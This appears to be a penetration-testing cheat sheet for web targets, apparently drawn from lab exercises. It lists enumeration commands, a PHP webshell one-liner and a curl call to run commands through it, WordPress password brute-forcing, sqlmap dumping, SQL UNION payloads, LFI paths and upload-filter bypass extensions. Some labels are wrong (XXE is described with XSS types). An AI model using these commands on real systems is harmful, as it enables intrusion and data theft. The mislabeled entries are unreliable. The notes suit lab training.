### Enumeration

- curl
  - curl -v -X OPTIONS http://10.10.10.10/
  - curl -v -X PUT http://10.10.10.10/
    - tests if can put files. 
- assetfinder
- subfinder
  - `subfinder -d url -o filename`
- Amass
  - `amass enum- d url`
- crt.sh
- dirbuster
- theHarvester
- httprobe - validate what is live
- gobuster
  - `gobuster dir -u http://10.10.10.10:port -w /usr/share/wordlists/dirb/big.txt`
- builtwith
- wappalyzer
  - software vulns
- Nikto
  - `nikto -h -10.10.10.10 -p 80,8080,1234`
- wpscan
  - `wpscan --update`
  - `wpscan --url <ip>`
  - `wpscan --url [url] --enumerate [p/vp/ap/t/vt/at] --plugins-detection aggressive`
  - `wpscan --url [target URL] --enumerate u`
  - `wpscan --url http://internal.thm/blog/ --passwords /opt/wordlists/rockyou.txt`
  - upload shell to WP_dashboard
- nmap scans
  - `nmap --script=http-enum <host>`
  - `nmap --script=http-vuln* $ip`
- GTFOBins
- sitemap.xml - add to end of url
  - `http://10.10.10.10/sitemap.xml`
- curl pages
- 
### webshell php

- `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`
- `curl http://SERVER_IP:PORT/shell.php?cmd=id`
- or upload reverse shell to be executed
  
### Options
- View contents of mysql files
  - Example: /content/inc/mysql_backup could contain .sql backup file with user hashes
-  Brute force
  - *reference username&password page*
- sqlmap
  - copy login portal post request from burp -> sqlmap.txt
  - `sqlmap -r sqlmap.txt --dump`
  - check for any interesting tables
- source code and inspect 
- LFI
  - Directories
    - /etc/passwd
    - /var/log/apache2/access.log
    - C:\Windows\System32\drivers\etc\hosts
- SQL Injection
  - Union
    - `' UNION SELECT NULL,NULL,NULL--`
    - `' UNION SELECT 'a',NULL,NULL,NULL--`
  - Bind
  - XXS
- Command Injection
- File Upload
  - .php5, .shtml, php.jpg, php%00.jpg
- Auth
- IDOR
  - attempt to manipulate url (such as an id number)
  - view post/get requests - data, query strings, cookies
    - decode, change it, and recode
- XXE
  - Reflected - comes from current HTTP request
  - Stored - comes from websites database
  - DOM-based - comes from client side code rather than service-side code
- Uniscan for LFI, RFI and RCE vulnerabilities
  - `uniscan -u http://10.10.10.10/ -qd`
- vuln scans
  - `nmap --script=http-enum <host>`
  - `nmap --script=http-vuln* $ip`
  - nikto -h $ip
    - very loud and obvious

#### Cookies
- `curl http://10.10.10.10/cookie-test`
- `curl -H "Cookie: logged_in=true; admin=false" http://10.10.10.10/cookie-test`
- `curl -H "Cookie: logged_in=true; admin=true" http://10.10.10.10/cookie-test`
- attempt to crack hashed cookies or decode encoded cookies

#### Favicon
- can view favicon hash and see if there are vulns
- `curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum`
- visit: https://wiki.owasp.org/index.php/OWASP_favicon_database
